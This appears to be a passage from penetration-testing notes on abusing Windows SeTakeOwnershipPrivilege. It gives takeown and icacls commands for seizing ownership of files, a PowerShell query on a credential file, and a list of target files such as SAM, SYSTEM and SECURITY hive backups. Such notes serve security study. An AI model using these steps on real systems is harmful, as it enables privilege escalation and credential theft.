\subsection{Abusing Privilege: SeTakeOwnership}

SeTakeOwnershipPrivilege grants a user the ability to take ownership of any
\emph{securable object} meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. 
\begin{verbatim}
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | 
Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={
    (Get-Acl $_.FullName).Owner }}
\end{verbatim}


\href{https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown}{takeown}
Windows binary to change ownership of the file and \verb+icacals+ 
\begin{verbatim}
takeown /f FILE_PATH
icacls FILE_PATH /grant SAMAN:F
\end{verbatim}

Files of Interest
\begin{itemize}
\item \verb+c:\inetpub\wwwwroot\web.config+
\item \verb+%WINDIR%\repair\sam+
\item \verb+%WINDIR%\repair\system+
\item \verb+%WINDIR%\repair\software, %WINDIR%\repair\security+
\item \verb+%WINDIR%\system32\config\SecEvent.Evt+
\item \verb+%WINDIR%\system32\config\default.sav+
\item \verb+%WINDIR%\system32\config\security.sav+
\item \verb+%WINDIR%\system32\config\software.sav+
\item \verb+%WINDIR%\system32\config\system.sav+
\end{itemize}

